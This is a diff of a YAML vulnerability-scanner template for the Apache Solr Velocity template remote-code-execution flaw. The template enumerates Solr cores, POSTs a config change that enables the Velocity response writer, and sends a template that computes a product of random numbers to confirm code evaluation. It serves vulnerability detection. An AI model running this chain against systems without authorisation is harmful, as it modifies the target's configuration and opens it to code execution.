@@ -1,40 +1,53 @@
-expression: r0() && r1() && r2()
 id: solr-velocity-template-rce
+
 info:
-  author: daffainfo
-  description: solr velocity template rce
   name: solr velocity template rce
-  reference:
-  - https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt
-  - https://cert.360.cn/warning/detail?id=fba518d5fc5c4ed4ebedff1dab24caf2
+  author: daffainfo
   severity: critical
-rules:
-  r0:
-    expression: response.status == 200 && response.body.bcontains(b"responseHeader")
-    output:
-      core: search["core"]
-      search: '"\"name\":\"(?P<core>[^\"]+)\"".bsubmatch(response.body)'
-    request:
-      follow_redirects: false
-      method: GET
-      path: /solr/admin/cores?wt=json
-  r1:
-    expression: response.status == 200
-    request:
-      body: "{\n  \"update-queryresponsewriter\": {\n    \"startup\": \"test\",\n\
-        \    \"name\": \"velocity\",\n    \"class\": \"solr.VelocityResponseWriter\"\
-        ,\n    \"template.base.dir\": \"\",\n    \"solr.resource.loader.enabled\"\
-        : \"true\",\n    \"params.resource.loader.enabled\": \"true\"\n  }\n}"
-      headers:
-        Content-Type: application/json
-      method: POST
-      path: /solr/{{core}}/config
-  r2:
-    expression: response.body.bcontains(bytes(string(r1 * r2)))
-    request:
-      follow_redirects: false
-      method: GET
-      path: /solr/{{core}}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set(%24c%3D{{r1}}%20*%20{{r2}})%24c
+  verified: false
+  description: |
+    solr velocity template rce
+  reference:
+    - https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt
+    - https://cert.360.cn/warning/detail?id=fba518d5fc5c4ed4ebedff1dab24caf2
+  tags: solr,rce
+  created: 2023/10/12
+
 set:
   r1: randomInt(20000, 40000)
   r2: randomInt(20000, 40000)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /solr/admin/cores?wt=json
+      follow_redirects: false
+    expression: response.status == 200 && response.body.bcontains(b"responseHeader")
+    output:
+      search: '"\"name\":\"(?P<core>[^\"]+)\"".bsubmatch(response.body)'
+      core: search["core"]
+  r1:
+    request:
+      method: POST
+      path: /solr/{{core}}/config
+      headers:
+        Content-Type: application/json
+      body: |-
+        {
+          "update-queryresponsewriter": {
+            "startup": "test",
+            "name": "velocity",
+            "class": "solr.VelocityResponseWriter",
+            "template.base.dir": "",
+            "solr.resource.loader.enabled": "true",
+            "params.resource.loader.enabled": "true"
+          }
+        }
+    expression: response.status == 200
+  r2:
+    request:
+      method: GET
+      path: /solr/{{core}}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set(%24c%3D{{r1}}%20*%20{{r2}})%24c
+      follow_redirects: false
+    expression: response.body.bcontains(bytes(string(r1 * r2)))
+expression: r0() && r1() && r2()
